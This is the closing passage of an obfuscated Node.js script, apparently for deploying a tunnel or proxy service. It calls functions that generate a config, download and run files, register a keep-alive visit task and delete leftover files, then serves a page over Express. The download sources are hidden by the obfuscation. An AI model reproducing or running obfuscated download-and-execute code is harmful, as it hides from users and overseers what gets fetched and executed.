_0x55d2d0=_0x536cb1;console['clear'](),console[_0x55d2d0(0x26d)](_0x55d2d0(0x27c)),console[_0x55d2d0(0x26d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x114429=_0xb8fcf7;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x114429(0x26d)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x569619=await axios[_0x114429(0x1e9)](_0x114429(0x224),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x114429(0x26d)]('automatic\x20access\x20task\x20added\x20successfully'),_0x569619;}catch(_0x3a1546){return console[_0x114429(0x25d)](_0x114429(0x239)+_0x3a1546['message']),null;}}async function startserver(){const _0x259920=_0xb8fcf7;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3647e4){console[_0x259920(0x25d)](_0x259920(0x25c),_0x3647e4);}}startserver()[_0xb8fcf7(0x214)](_0x5a4531=>{const _0x45670c=_0xb8fcf7;console['error'](_0x45670c(0x1d3),_0x5a4531);}),app[_0xb8fcf7(0x20b)]('/',async function(_0x36a934,_0x6e424d){const _0x44d47d=_0xb8fcf7;try{const _0x5b4b39=path['join'](__dirname,_0x44d47d(0x217)),_0x4f1729=await fs['promises'][_0x44d47d(0x221)](_0x5b4b39,_0x44d47d(0x266));_0x6e424d[_0x44d47d(0x21f)](_0x4f1729);}catch(_0x1a205b){_0x6e424d[_0x44d47d(0x21f)](_0x44d47d(0x293));}}),app[_0xb8fcf7(0x26a)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
